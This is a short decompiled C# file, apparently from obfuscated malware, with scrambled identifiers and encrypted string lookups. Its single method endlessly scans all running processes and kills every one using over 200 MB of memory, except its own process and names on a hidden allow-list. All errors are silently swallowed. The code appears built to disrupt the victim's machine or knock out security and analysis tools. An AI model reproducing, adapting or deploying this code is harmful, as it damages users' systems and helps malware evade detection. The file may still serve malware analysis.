using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace JNgWsfAJdq;

public static class IDthsFgIbBDC
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void uzjzTnaoUcwUMx()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107459861)) && !process.ProcessName.Contains(getString_0(107459852)) && !process.ProcessName.Contains(getString_0(107459875)) && !process.ProcessName.Contains(getString_0(107459866)) && !process.ProcessName.Contains(getString_0(107459821)) && !process.ProcessName.Contains(getString_0(107459840)) && !process.ProcessName.Contains(getString_0(107459795)) && !process.ProcessName.Contains(getString_0(107459814)) && !process.ProcessName.Contains(getString_0(107459801)) && !process.ProcessName.Contains(getString_0(107459756)) && !process.ProcessName.Contains(getString_0(107460247)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static IDthsFgIbBDC()
	{
		Strings.CreateGetStringDelegate(typeof(IDthsFgIbBDC));
	}
}
